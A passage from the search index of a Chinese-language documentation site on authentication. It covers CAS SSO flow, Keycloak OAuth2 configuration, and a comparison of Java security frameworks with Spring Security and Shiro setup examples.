\u2502\n \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502                 \u2502\n \u2502               \u2502 5. A\u9a8c\u8bc1ST         \u2502                 \u2502\n \u2502               \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                 \u2502\n \u2502               \u2502 6. \u8fd4\u56de\u7528\u6237\u4fe1\u606f     \u2502                 \u2502\n \u2502               \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                 \u2502\n \u2502               \u2502 7. A\u521b\u5efa\u4f1a\u8bdd       \u2502                 \u2502\n \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                    \u2502                 \u2502\n \u2502 8. \u8bbf\u95eeB      \u2502                    \u2502                 \u2502\n \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502\n \u2502               \u2502                    \u2502 9. \u91cd\u5b9a\u5411\u5230CAS  \u2502\n \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n \u2502               \u2502                    \u2502 10. CAS\u68c0\u67e5TGC  \u2502\n \u2502               \u2502                    \u2502     \u5df2\u767b\u5f55      \u2502\n \u2502               \u2502                    \u2502 11. \u76f4\u63a5\u8fd4\u56deST  \u2502\n \u2502               \u2502                    \u2502    (\u65e0\u9700\u518d\u767b\u5f55) \u2502\n \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n</code></pre></p> <p>\u5173\u952e\u6982\u5ff5\uff1a - TGT (Ticket Granting Ticket): \u7968\u636e\u6388\u4e88\u7968\u636e\uff0c\u5b58\u50a8\u5728CAS\u670d\u52a1\u5668 - TGC (Ticket Granting Cookie): \u7968\u636e\u6388\u4e88Cookie\uff0c\u5b58\u50a8\u5728\u6d4f\u89c8\u5668 - ST (Service Ticket): \u670d\u52a1\u7968\u636e\uff0c\u4e00\u6b21\u6027\u4f7f\u7528</p> <p>Java\u5b9e\u73b0\uff08\u4f7f\u7528Apereo CAS Client\uff09\uff1a</p> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.jasig.cas.client&lt;/groupId&gt;\n    &lt;artifactId&gt;cas-client-core&lt;/artifactId&gt;\n    &lt;version&gt;3.6.4&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <pre><code>/**\n * CAS\u5ba2\u6237\u7aef\u914d\u7f6e\n */\n@Configuration\npublic class CASClientConfig {\n\n    @Value(\"${cas.server.url}\")\n    private String casServerUrl;\n\n    @Value(\"${cas.client.url}\")\n    private String clientUrl;\n\n    /**\n     * CAS\u8ba4\u8bc1\u8fc7\u6ee4\u5668\n     */\n    @Bean\n    public FilterRegistrationBean&lt;AuthenticationFilter&gt; casAuthenticationFilter() {\n        FilterRegistrationBean&lt;AuthenticationFilter&gt; registration = \n            new FilterRegistrationBean&lt;&gt;();\n\n        AuthenticationFilter filter = new AuthenticationFilter();\n        filter.setCasServerLoginUrl(casServerUrl + \"/login\");\n        filter.setServerName(clientUrl);\n\n        registration.setFilter(filter);\n        registration.addUrlPatterns(\"/*\");\n        registration.setOrder(1);\n\n        return registration;\n    }\n\n    /**\n     * CAS\u7968\u636e\u9a8c\u8bc1\u8fc7\u6ee4\u5668\n     */\n    @Bean\n    public FilterRegistrationBean&lt;Cas30ProxyReceivingTicketValidationFilter&gt; \n            casValidationFilter() {\n\n        FilterRegistrationBean&lt;Cas30ProxyReceivingTicketValidationFilter&gt; registration = \n            new FilterRegistrationBean&lt;&gt;();\n\n        Cas30ProxyReceivingTicketValidationFilter filter = \n            new Cas30ProxyReceivingTicketValidationFilter();\n        filter.setServerName(clientUrl);\n        filter.setTicketValidator(ticketValidator());\n\n        registration.setFilter(filter);\n        registration.addUrlPatterns(\"/*\");\n        registration.setOrder(2);\n\n        return registration;\n    }\n\n    @Bean\n    public Cas30ServiceTicketValidator ticketValidator() {\n        return new Cas30ServiceTicketValidator(casServerUrl);\n    }\n}\n\n/**\n * \u83b7\u53d6\u5f53\u524d\u7528\u6237\n */\n@Controller\npublic class UserController {\n\n    @GetMapping(\"/api/me\")\n    @ResponseBody\n    public Map&lt;String, Object&gt; getCurrentUser(HttpServletRequest request) {\n        // \u4eceCAS\u83b7\u53d6\u7528\u6237\u4fe1\u606f\n        AttributePrincipal principal = \n            (AttributePrincipal) request.getUserPrincipal();\n\n        if (principal == null) {\n            throw new UnauthorizedException();\n        }\n\n        Map&lt;String, Object&gt; userInfo = new HashMap&lt;&gt;();\n        userInfo.put(\"username\", principal.getName());\n        userInfo.put(\"attributes\", principal.getAttributes());\n\n        return userInfo;\n    }\n}\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#3-oauth2oidcsso","title":"3. \u57fa\u4e8eOAuth2/OIDC\u7684SSO","text":"<p>\u73b0\u4ee3SSO\u7684\u4e3b\u6d41\u5b9e\u73b0\u65b9\u5f0f\uff0c\u8be6\u89c1\u524d\u9762\u7684OAuth2\u548cOIDC\u7ae0\u8282\u3002</p> <p>\u793a\u4f8b\uff1a\u4f7f\u7528Keycloak\u5b9e\u73b0SSO</p> <pre><code># application.yml\nspring:\n  security:\n    oauth2:\n      client:\n        registration:\n          keycloak:\n            client-id: my-app\n            client-secret: secret\n            scope: openid,profile,email\n            authorization-grant-type: authorization_code\n            redirect-uri: \"{baseUrl}/login/oauth2/code/keycloak\"\n        provider:\n          keycloak:\n            issuer-uri: http://keycloak-server/realms/myrealm\n            user-name-attribute: preferred_username\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#_3","title":"\u534f\u8bae\u9009\u578b\u6307\u5357","text":"\u573a\u666f \u63a8\u8350\u534f\u8bae \u7406\u7531 \u73b0\u4ee3Web\u5e94\u7528 OAuth 2.0 + OIDC \u6807\u51c6\u5316\u3001\u5e7f\u6cdb\u652f\u6301\u3001\u8f7b\u91cf\u7ea7 \u4f01\u4e1a\u5185\u90e8SSO SAML 2.0 \u6216 OIDC SAML\u6210\u719f\u7a33\u5b9a\uff0cOIDC\u66f4\u73b0\u4ee3 \u79fb\u52a8\u5e94\u7528 OAuth 2.0 + PKCE \u5b89\u5168\u3001\u9002\u5408\u516c\u5171\u5ba2\u6237\u7aef \u524d\u540e\u7aef\u5206\u79bb JWT Token \u65e0\u72b6\u6001\u3001\u8de8\u57df\u53cb\u597d \u5fae\u670d\u52a1\u67b6\u6784 OAuth 2.0 Client Credentials \u670d\u52a1\u95f4\u8ba4\u8bc1 \u4f20\u7edfWeb\u5e94\u7528 Session/Cookie \u7b80\u5355\u3001\u53ef\u9760"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#_4","title":"\u603b\u7ed3","text":"<p>\u672c\u6587\u6863\u4ecb\u7ecd\u4e86\u4e3b\u6d41\u7684\u8ba4\u8bc1\u6388\u6743\u534f\u8bae\u548c\u6807\u51c6\uff1a</p> <ol> <li>Cookie/Session: \u4f20\u7edf\u7684Web\u4f1a\u8bdd\u7ba1\u7406\u65b9\u5f0f</li> <li>JWT: \u73b0\u4ee3\u65e0\u72b6\u6001Token\u8ba4\u8bc1\u65b9\u6848</li> <li>OAuth 2.0: \u6388\u6743\u534f\u8bae\u6807\u51c6\uff0c\u652f\u6301\u591a\u79cd\u6388\u6743\u6a21\u5f0f</li> <li>OIDC: \u57fa\u4e8eOAuth 2.0\u7684\u8eab\u4efd\u8ba4\u8bc1\u5c42</li> <li>SAML: \u4f01\u4e1a\u7ea7\u5355\u70b9\u767b\u5f55\u6807\u51c6</li> <li>SSO: \u591a\u79cd\u5355\u70b9\u767b\u5f55\u5b9e\u73b0\u65b9\u5f0f</li> </ol> <p>\u7ee7\u7eed\u5b66\u4e60\uff1a - \u4e0a\u4e00\u7ae0\uff1a\u8ba4\u8bc1\u6388\u6743\u57fa\u7840 - \u4e0b\u4e00\u7ae0\uff1aJava\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/","title":"Java\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_1","title":"\u76ee\u5f55","text":"<ul> <li>\u6846\u67b6\u6982\u89c8</li> <li>Spring Security</li> <li>Apache Shiro</li> <li>JAAS</li> <li>Keycloak</li> <li>Pac4j</li> <li>\u6846\u67b6\u9009\u578b\u5efa\u8bae</li> </ul>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_2","title":"\u6846\u67b6\u6982\u89c8","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#java_1","title":"\u4e3b\u6d41Java\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4\u8868","text":"\u6846\u67b6 \u7c7b\u578b \u590d\u6742\u5ea6 \u5b66\u4e60\u66f2\u7ebf \u793e\u533a\u6d3b\u8dc3\u5ea6 \u9002\u7528\u573a\u666f Spring Security \u5168\u9762\u5b89\u5168\u6846\u67b6 \u9ad8 \u9661\u5ced \u2b50\u2b50\u2b50\u2b50\u2b50 Spring\u751f\u6001\u5e94\u7528 Apache Shiro \u8f7b\u91cf\u5b89\u5168\u6846\u67b6 \u4e2d \u5e73\u7f13 \u2b50\u2b50\u2b50 \u72ec\u7acb\u5e94\u7528\u3001\u7b80\u5355\u9700\u6c42 JAAS Java\u6807\u51c6API \u4f4e \u4e2d\u7b49 \u2b50\u2b50 Java SE\u5e94\u7528 Keycloak IAM\u5e73\u53f0 \u9ad8 \u5e73\u7f13 \u2b50\u2b50\u2b50\u2b50 \u4f01\u4e1aSSO\u3001\u5fae\u670d\u52a1 Pac4j \u591a\u534f\u8bae\u5ba2\u6237\u7aef \u4e2d \u5e73\u7f13 \u2b50\u2b50\u2b50 \u591a\u534f\u8bae\u96c6\u6210"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_3","title":"\u529f\u80fd\u5bf9\u6bd4\u77e9\u9635","text":"\u529f\u80fd Spring Security Apache Shiro JAAS Keycloak Pac4j \u8ba4\u8bc1 \u2705 \u2705 \u2705 \u2705 \u2705 \u6388\u6743 \u2705 \u2705 \u2705 \u2705 \u2705 \u4f1a\u8bdd\u7ba1\u7406 \u2705 \u2705 \u274c \u2705 \u2705 \u8bb0\u4f4f\u6211 \u2705 \u2705 \u274c \u2705 \u2705 OAuth2\u652f\u6301 \u2705 \u26a0\ufe0f \u274c \u2705 \u2705 OIDC\u652f\u6301 \u2705 \u274c \u274c \u2705 \u2705 SAML\u652f\u6301 \u2705 \u274c \u274c \u2705 \u2705 JWT\u652f\u6301 \u2705 \u26a0\ufe0f \u274c \u2705 \u2705 LDAP\u96c6\u6210 \u2705 \u2705 \u2705 \u2705 \u274c \u5bc6\u7801\u52a0\u5bc6 \u2705 \u2705 \u274c \u2705 \u274c CSRF\u9632\u62a4 \u2705 \u274c \u274c N/A \u274c \u65b9\u6cd5\u5b89\u5168 \u2705 \u2705 \u274c N/A \u274c Web\u5b89\u5168 \u2705 \u2705 \u274c N/A \u2705 \u5fae\u670d\u52a1\u652f\u6301 \u2705 \u26a0\ufe0f \u274c \u2705 \u2705 \u7ba1\u7406\u754c\u9762 \u274c \u274c \u274c \u2705 \u274c \u591a\u79df\u6237 \u26a0\ufe0f \u26a0\ufe0f \u274c \u2705 \u274c <p>\u2705 \u5b8c\u5168\u652f\u6301 | \u26a0\ufe0f \u90e8\u5206\u652f\u6301/\u9700\u989d\u5916\u914d\u7f6e | \u274c \u4e0d\u652f\u6301 | N/A \u4e0d\u9002\u7528</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#spring-security","title":"Spring Security","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_4","title":"\u6982\u8ff0","text":"<p>Spring Security \u662fSpring\u751f\u6001\u4e2d\u7684\u5b89\u5168\u6846\u67b6\uff0c\u63d0\u4f9b\u5168\u9762\u7684\u8ba4\u8bc1\u548c\u6388\u6743\u89e3\u51b3\u65b9\u6848\u3002</p> <p>\u5b98\u7f51\uff1a https://spring.io/projects/spring-security</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_5","title":"\u6838\u5fc3\u7279\u6027","text":"<ol> <li>\u5168\u9762\u7684\u8ba4\u8bc1\u652f\u6301</li> <li>\u8868\u5355\u767b\u5f55</li> <li>HTTP Basic/Digest</li> <li>OAuth2/OIDC</li> <li>SAML2</li> <li>LDAP</li> <li> <p>\u81ea\u5b9a\u4e49\u8ba4\u8bc1</p> </li> <li> <p>\u7075\u6d3b\u7684\u6388\u6743\u673a\u5236</p> </li> <li>URL\u7ea7\u522b\u6388\u6743</li> <li>\u65b9\u6cd5\u7ea7\u522b\u6388\u6743</li> <li>ACL\uff08\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff09</li> <li> <p>\u8868\u8fbe\u5f0f\u652f\u6301\uff08SpEL\uff09</p> </li> <li> <p>\u9632\u62a4\u673a\u5236</p> </li> <li>CSRF\u9632\u62a4</li> <li>Session\u56fa\u5b9a\u653b\u51fb\u9632\u62a4</li> <li>\u5b89\u5168\u5934\u914d\u7f6e</li> <li>\u5bc6\u7801\u52a0\u5bc6</li> </ol>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_6","title":"\u67b6\u6784\u6982\u89c8","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    Security Filter Chain                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 SecurityContextPersistenceFilter                        \u2502\n\u2502 LogoutFilter                                            \u2502\n\u2502 UsernamePasswordAuthenticationFilter                    \u2502\n\u2502 BasicAuthenticationFilter                               \u2502\n\u2502 RequestCacheAwareFilter                                 \u2502\n\u2502 SecurityContextHolderAwareRequestFilter                 \u2502\n\u2502 AnonymousAuthenticationFilter                           \u2502\n\u2502 SessionManagementFilter                                 \u2502\n\u2502 ExceptionTranslationFilter                              \u2502\n\u2502 FilterSecurityInterceptor                               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                          \u2502\n                          \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              AuthenticationManager                       \u2502\n\u2502                       \u2502                                  \u2502\n\u2502                       \u25bc                                  \u2502\n\u2502           ProviderManager (delegates to)                \u2502\n\u2502                       \u2502                                  \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                   \u2502\n\u2502         \u25bc             \u25bc             \u25bc                   \u2502\n\u2502   DaoAuthentication  Ldap...   Custom...                \u2502\n\u2502      Provider       Provider    Provider                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_7","title":"\u5feb\u901f\u5f00\u59cb","text":"<p>Maven\u4f9d\u8d56\uff1a <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre></p> <p>\u57fa\u7840\u914d\u7f6e\uff1a <pre><code>/**\n * Spring Security\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/public/**\").permitAll()\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                .anyRequest().authenticated()\n            )\n            .formLogin(form -&gt; form\n                .loginPage(\"/login\")\n                .defaultSuccessUrl(\"/dashboard\")\n                .permitAll()\n            )\n            .logout(logout -&gt; logout\n                .logoutUrl(\"/logout\")\n                .logoutSuccessUrl(\"/login?logout\")\n                .permitAll()\n            )\n            .csrf(csrf -&gt; csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));\n\n        return http.build();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n\n    @Bean\n    public UserDetailsService userDetailsService() {\n        // \u5185\u5b58\u7528\u6237\uff08\u4ec5\u7528\u4e8e\u6d4b\u8bd5\uff09\n        UserDetails user = User.builder()\n            .username(\"user\")\n            .password(passwordEncoder().encode(\"password\"))\n            .roles(\"USER\")\n            .build();\n\n        UserDetails admin = User.builder()\n            .username(\"admin\")\n            .password(passwordEncoder().encode(\"admin\"))\n            .roles(\"USER\", \"ADMIN\")\n            .build();\n\n        return new InMemoryUserDetailsManager(user, admin);\n    }\n}\n</code></pre></p> <p>\u81ea\u5b9a\u4e49UserDetailsService\uff08\u6570\u636e\u5e93\uff09\uff1a <pre><code>@Service\npublic class CustomUserDetailsService implements UserDetailsService {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        User user = userRepository.findByUsername(username)\n            .orElseThrow(() -&gt; new UsernameNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728: \" + username));\n\n        return org.springframework.security.core.userdetails.User.builder()\n            .username(user.getUsername())\n            .password(user.getPassword())\n            .authorities(getAuthorities(user))\n            .accountExpired(!user.isAccountNonExpired())\n            .accountLocked(!user.isAccountNonLocked())\n            .credentialsExpired(!user.isCredentialsNonExpired())\n            .disabled(!user.isEnabled())\n            .build();\n    }\n\n    private Collection&lt;? extends GrantedAuthority&gt; getAuthorities(User user) {\n        return user.getRoles().stream()\n            .map(role -&gt; new SimpleGrantedAuthority(\"ROLE_\" + role))\n            .collect(Collectors.toList());\n    }\n}\n</code></pre></p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_8","title":"\u4f18\u7f3a\u70b9","text":"<p>\u4f18\u70b9\uff1a - \u2705 Spring\u751f\u6001\u6df1\u5ea6\u96c6\u6210 - \u2705 \u529f\u80fd\u5168\u9762\uff0c\u4f01\u4e1a\u7ea7\u6807\u51c6 - \u2705 \u793e\u533a\u6d3b\u8dc3\uff0c\u6587\u6863\u4e30\u5bcc - \u2705 \u6301\u7eed\u66f4\u65b0\uff0c\u7d27\u8ddf\u5b89\u5168\u8d8b\u52bf - \u2705 \u652f\u6301\u6700\u65b0\u534f\u8bae\uff08OAuth2\u3001OIDC\uff09 - \u2705 \u5f3a\u5927\u7684\u6269\u5c55\u6027</p> <p>\u7f3a\u70b9\uff1a - \u274c \u5b66\u4e60\u66f2\u7ebf\u9661\u5ced - \u274c \u914d\u7f6e\u590d\u6742\uff08\u65b0\u7248\u672c\u6709\u6539\u5584\uff09 - \u274c \u8fc7\u6ee4\u5668\u94fe\u8c03\u8bd5\u56f0\u96be - \u274c \u4e0e\u975eSpring\u9879\u76ee\u96c6\u6210\u56f0\u96be - \u274c \u6587\u6863\u6709\u65f6\u6ede\u540e\u4e8e\u7248\u672c\u66f4\u65b0</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_9","title":"\u9002\u7528\u573a\u666f","text":"<ul> <li>Spring Boot/Spring MVC\u5e94\u7528</li> <li>\u4f01\u4e1a\u7ea7\u5e94\u7528</li> <li>\u9700\u8981\u5168\u9762\u5b89\u5168\u7279\u6027\u7684\u9879\u76ee</li> <li>OAuth2/OIDC\u96c6\u6210</li> <li>\u5fae\u670d\u52a1\u67b6\u6784</li> </ul>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#apache-shiro","title":"Apache Shiro","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_10","title":"\u6982\u8ff0","text":"<p>Apache Shiro \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684Java\u5b89\u5168\u6846\u67b6\uff0c\u6613\u4e8e\u4f7f\u7528\u548c\u7406\u89e3\u3002</p> <p>\u5b98\u7f51\uff1a https://shiro.apache.org/</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_11","title":"\u6838\u5fc3\u6982\u5ff5","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Application Code                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                   \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Subject (\u5f53\u524d\u7528\u6237)              \u2502\n\u2502  login(), logout(), hasRole(), isPermitted() \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                   \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           SecurityManager (\u6838\u5fc3)             \u2502\n\u2502     Authenticator | Authorizer | Session     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                   \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502               Realm (\u6570\u636e\u6e90)                 \u2502\n\u2502    JDBC | LDAP | Custom | IniRealm          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>\u6838\u5fc3\u7ec4\u4ef6\uff1a 1. Subject: \u5f53\u524d\u64cd\u4f5c\u7528\u6237 2. SecurityManager: \u5b89\u5168\u7ba1\u7406\u5668\uff08\u6838\u5fc3\uff09 3. Realm: \u5b89\u5168\u6570\u636e\u6e90 4. Authenticator: \u8ba4\u8bc1\u5668 5. Authorizer: \u6388\u6743\u5668 6. SessionManager: \u4f1a\u8bdd\u7ba1\u7406\u5668 7. CacheManager: \u7f13\u5b58\u7ba1\u7406\u5668</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_12","title":"\u5feb\u901f\u5f00\u59cb","text":"<p>Maven\u4f9d\u8d56\uff1a <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;\n    &lt;artifactId&gt;shiro-spring-boot-starter&lt;/artifactId&gt;\n    &lt;version&gt;1.13.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre></p> <p>\u914d\u7f6e\u6587\u4ef6\uff08shiro.ini\uff09\uff1a <pre><code>[main]\n# \u5b9a\u4e49Realm\nmyRealm = com.example.MyCustomRealm\nsecurityManager.realms = $myRealm\n\n# 